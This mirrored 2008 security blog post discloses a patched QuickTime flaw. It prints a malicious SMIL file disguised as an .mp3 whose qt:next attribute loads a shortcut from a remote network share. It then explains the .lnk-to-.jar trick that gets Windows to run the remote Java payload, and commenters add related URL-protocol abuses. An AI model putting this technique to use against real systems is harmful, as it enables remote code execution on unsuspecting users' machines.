<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
	
<!-- Mirrored from www.gnucitizen.org/blog/details-of-the-quicktime-vulnerability/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:24:01 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
<head>
		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
		<link rel="profile" href="http://gmpg.org/xfn/11"/>
		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
		<title>GNUCITIZEN &raquo; Details of the QuickTime Vulnerability</title>
			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; Details of the QuickTime Vulnerability Comments Feed" href="feed/index.html" />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
<link rel='prev' title='My BH Las Vegas Slides' href='../my-bh-las-vegas-slides/index.html' />
<link rel='next' title='The QuickTime Vulnerability Overview' href='../the-quicktime-vulnerability-overview/index.html' />
<meta name="generator" content="WordPress 3.3.2" />
<link rel='canonical' href='index.html' />
<link rel='shortlink' href='../../index80fa.html?p=1209' />
<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
	
	<body id="single" class="blog">
		<div id="header">
			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
			<p><span>Information Security Think Tank</span></p>
		</div>

<div id="navigation">
	<h2>Navigation</h2>
	<ul>
		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
			</ul>
</div>

<div id="content">
			<div id="entry">
							<div id="post-1209" class="post">
	<div class="post-title"><h2><span>Details of the QuickTime Vulnerability</span></h2></div>
	<div class="post-date"><span>published:</span> September 9th, 2008</div>
	<div class="post-content"><div class="single-content-top-widgets"></div><p>In this post I intend to give a brief overview of the QuickTime vulnerability which I partially-disclosed over <a href="../quicktime-0day-for-vista-and-xp/index.html">here</a>. I should have made these details public long time ago but better late than never. The vulnerability has been fixed for several months now and I believe it is safe to talk about it in the public.</p>

<p>Let&#8217;s start with an example. The following is the source code of a malicious QuickTime SMIL file:</p>

<pre><code><strong>SMILtext</strong> &lt;smil
xmlns:qt="http://www.apple.com/quicktime/resourc
es/smilextensions" qt:autoplay="true"
qt:next="<strong>file://172.16.3.124/evil/evil.lnk</strong>"&gt;
&lt;body&gt;
&lt;seq repeatCount="indefinite"&gt;
&lt;img src="test.jpg" dur="1s"/&gt;
&lt;img src="test.jpg" dur="1s"/&gt;
&lt;/seq&gt;
&lt;/body&gt;
&lt;/smil&gt;</code></pre>

<p>First of all, we start with the SMIL header (<code>SMILtext</code>). This is necessary in order to masquerade the file as a different file type, i.e. if we paste the above text into a file with extension <code>.mp3</code>, it will still play in QuickTime. We can use practically any other file extension which defaults to the QuickTime player.</p>

<p>After that we follow with a very standard SMIL document. The most interesting information in order to make the exploit works is contained inside the <code>qt:next</code> attribute of the <code>smil</code> root element. This attribute instructs QuickTime to play another media file after we are done with the current one. The attribute expects a URL which can start with the <code>file://</code> protocol handler. This is understandable since we might want to play local files as well as remote ones, i.e. <code>http://</code>.</p>

<p>The URL is passed to the <code>FileProtocolHandler</code> from <code>url.dll</code>. The function understands that we are asking for a local resource. However, pay attention on the format of the URL we are passing. Let&#8217;s take a closer look:</p>

<pre><code>file://172.16.3.124/evil/evil.lnk</code></pre>

<p>Most of you will recognize that this is a URL which points to a NETBIOS share located on <code>172.16.3.124</code>.

<p>Perhaps you are thinking that this is the problem. Well yes, but we are not there just yet. Initially, when I was playing with this bug, I was trying to launch a URL like this one: <code>file://172.16.3.124/evil/evil.exe</code>. The URL points to an executable. Unfortunately, the attack was failing because usually XP SP1 and up, I believe (excuse my ignorance), will warn you that you are trying to execute an application from an untrusted share. Typically, you will see a warning box but because <code>FileProtocolHandler</code> suppresses that, the function silently fails. I&#8217;ve tried with <code>.bat</code>, <code>.cmd</code>, <code>.vbs</code>, <code>.js</code>, <code>.application</code> and other known executable file formats but none of them seemed to work. This is due to the fact that the operating system knows that these files are executables and could harm your system, therefore it prevents their execution.</p>

<p>So I needed to find a file format which is executable but Windows does not know about it just yet. It seems that <code>.jar</code> fits perfectly my requirements. <code>.jar</code> is the file extension of the JAR archive, a ZIP archive with a manifest file which instructs the Java interpreter what class should be executed as the main one. <code>.jar</code> files are executable as long as you have Java on your system.</p>

<p>So we are done! Right? Not quite. If you try to send <code>file://172.16.3.124/evil/evil.jar</code> to <code>FileProtocolHandler</code> you will notice that <code>java.exe</code> fails with an error messages informing you that there is no such class. What happens is that Java does not understand what <code>file://172.16.3.124/evil/evil.jar</code> actually is. This is due to the fact that the URL notation we are using is non-standard, i.e. it is made up by Microsoft&#8217;s engineers to seamlessly incorporate NETBIOS shares into the operating system.</p>

<p>So what do we do? It took me some time to figure this out. My approach is very simple. First of all we create a simple <code>.lnk</code> (link/shortcut) file in the same directory where the malicious <code>.jar</code> file is located. Then we use the shortcut to rewrite the URL from <code>file://172.16.3.124/evil/evil.jar</code> to <code>\\172.16.3.124\evil\evil.jar</code>, which is the correct NETBIOS notation. The Java interpreter is very much aware of this syntax and it will happily load the file and attack the victim&#8217;s system.</p>

<blockquote>In summary, I had to go from QuickTime to Windows Internals to URL Manipulation to Java. However, the attack is very simple to implement and understand, yet very effective. <em>I must say that you can definitely win a laptop on the annual POWN2OWN contest by using as simple trick as the one presented here.</em> Security vulnerabilities do not have to be complicated!</blockquote>

<p><em>I am planning to talk about the impact of this attack in my next post.</em></p><div class="single-content-bottom-widgets"></div></div>
		<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/exploit/index.html" rel="tag">exploit</a> | <a href="../../tags/quicktime/index.html" rel="tag">QuickTime</a> | <a href="../../tags/security/index.html" rel="tag">security</a> | <a href="../../tags/vulnerability/index.html" rel="tag">vulnerability</a></div></div>
				

				<div id="post-comments">
					<div class="comment byuser comment-author-pagvac even thread-even depth-1" id="comment-123640">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/0367b81839d31a5fa3d7bea79ef71b9e?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.linkedin.com/in/pagvac' rel='external nofollow' class='url'>Adrian 'pagvac' Pastor</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123640">
			September 9, 2008 at 11:45 pm</a>		</div>

		<p>This is a neat example of a simple bug that can lead to command execution. Simple yet effective.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-123648">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/44c5e290ccf283471210752d0b1ed6df?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.packetguru.org/' rel='external nofollow' class='url'>djTeller</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123648">
			September 10, 2008 at 9:16 am</a>		</div>

		<p>So Simple but yet so destructive. I guess QT rushed into fixing this bug, so there are probably some more attack vectors with the SMIL format or even the same one with a twist.</p>
<p>Great work PDP thanks for the info.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-123726">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/58ac1fd34df5f0d1fb9d30e1d8e3dee0?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">denka</cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123726">
			September 15, 2008 at 7:23 pm</a>		</div>

		<p>Can you be specific to the extent of damage the Java application loaded in this way (from a share) can do? Will it not fail with any attempt to read/write files, or launch other applications?</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment byuser comment-author-admin odd alt thread-odd thread-alt depth-1" id="comment-123741">
				<div class="comment-author vcard">
		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123741">
			September 17, 2008 at 10:53 am</a>		</div>

		<p>in my POC, it launches the system calculator and this is enough to make me worried.</p>

		<div class="reply">
				</div>
		</div>
		<div class="comment even thread-even depth-1" id="comment-126208">
				<div class="comment-author vcard">
		<img alt='' src='http://1.gravatar.com/avatar/774a2b5796bd7a278963235faeecc998?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='http://www.secumania.net/' rel='external nofollow' class='url'>Edu</a></cite> <span class="says">says:</span>		</div>

		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-126208">
			March 1, 2009 at 8:00 pm</a>		</div>

		<p>First of all, sorry for bumping this up. Read this please as it may clear out stuff.</p>
<p>from what I read from your Quick Time POC, you use the qtnext instruction to open an arbitrary URL. The vulnerability itself is not in Quicktime but in the function of the url.dll file that is called. Internet shortcut files functions in a similar way, although the function executed is from ieframe.dll, not url.dll (at least when IE 7 is installed). </p>
<p>For what I read, what happens is that the qtnext instruction is executed pretty much like an URL file, so that the file that will be opened will be subject to the famous Internet Explorer security zones scheme. dotted URL addresses are automatically put in the Internet security zone by default, in which the default setting for opening programs and unsafe files (unsafe means the extension is in the Microsoft blacklist, this includes a hell lot of file types, like .url, .chm., .hta, .wsf, etc) is set to prompt, so this is why it was not working (You were probably getting a file execution prompt, which informs u the file name and extension plus the type and Editor, if it has a valid digital signature). If you had used an address such as file&#58;//computername/share/file.exe it would probably work just fine, in case you have IE 6 or if IE 7 has determined your computer is part of a domain and/or if you have manually enabled the intranet settings, because the file is automatically put in the Local Intranet security zone. </p>
<p>XP SP2/SP3 operating system has got a bug in which for some reason, when you open an internet shortcut that points to a shortcut file located in a network share (at the internet security zone), it will be automatically loaded and executed, as long as the command line for the shortcut (.LNK file) points to a local program, which in turn you can pass parameters. and thatÂ´s why it worked for QuickTime.</p>
<p>PS: Windows 2000 SP4 seems to automatically load and run arbitrary files located in network shares (that include addresses placed in both the local intranet and internet zone), so I guess if you pointed the qtnext instruction to an address such as file&#58;//x.x.x.x/share/file.exe, the file.exe would be automatically executed on this system. I say *seems* because this copy of Windows 2000 I have I downloaded from the internet and installed over a virtual machine and it could be messed up.</p>
<p>I remember joking with friends that had Quicktime, by passing the url shell:personal to the qtnext parameter and it would load the contents of mydocuments folder. The fact that you can pass arbitrary URL protocols to the qtnext opens a door for a known type of attack : parameter injection on URL protocols.</p>

		<div class="reply">
				</div>
		</div>
		</div>
		
		<div class="post-comments-navigation">
			<div class="older-comments"></div>
			<div class="newer-comments"></div>
		</div>
	
	<div id="post-response">
		<h2>Respond</h2>
					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
									<div><label for="author">name: (required)</label></div>
					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
					<div><label for="email">mail: (required)</label></div>
					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
					<div><label for="url">website:</label></div>
					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
								<div><label for="comment">comment:</label></div>
				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
				<div>
					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
				</div>
				<input type="hidden" name="comment_post_ID" value="1209"/>
				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="c6372b855a" /></p>

	<p style="clear: both;" class="subscribe-to-comments">
	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
	<label for="subscribe">Notify me of followup comments via e-mail</label>
	</p>


			</form>
			</div>
					</div>
		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>

				
		<div id="footer">
			
	<script type="text/javascript">
		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
	</script>
	<script type="text/javascript">
		var pageTracker = _gat._getTracker('UA-363996-1');
		pageTracker._initData();
		pageTracker._trackPageview();
	</script>

				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
		</div>
		
		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
			<Work rdf:about="">
				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
				<dc:title>GNUCITIZEN</dc:title>
				<dc:date>2005-2012</dc:date>
				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
				<dc:source rdf:resource="http://www.gnucitizen.org"/>
			</Work>
			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
			</License>
		</rdf:RDF> -->
		
		<!-- tested by blogsecurify -->
		<!-- wpscanner -->
	</body>

<!-- Mirrored from www.gnucitizen.org/blog/details-of-the-quicktime-vulnerability/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:24:01 GMT -->
<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
</html>
